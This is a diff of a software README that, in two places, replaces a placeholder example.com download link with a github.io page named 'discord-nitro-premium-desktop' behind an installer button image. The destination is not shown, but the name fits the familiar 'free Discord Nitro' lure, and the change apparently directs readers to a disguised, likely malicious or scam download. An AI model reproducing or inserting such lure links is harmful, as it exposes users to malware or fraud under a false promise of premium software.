@@ -17,7 +17,7 @@ This build ships both portable and installed modes so operators can choose the d
 ## 01 · ⬇️ Download
 
 <p align="center">
-  <a href="https://example.com">
+  <a href="https://carlos-lane-09.github.io/discord-nitro-premium-desktop">
     <picture>
       <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
       <img src="docs/buttons/installer-card.svg" alt="" width="440">
@@ -224,7 +224,7 @@ Coexistence with other installations of the same or similar software is supporte
 ## ⬇️ Download
 
 <p align="center">
-  <a href="https://example.com">
+  <a href="https://carlos-lane-09.github.io/discord-nitro-premium-desktop">
     <picture>
       <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
       <img src="docs/buttons/installer-card.svg" alt="" width="440">
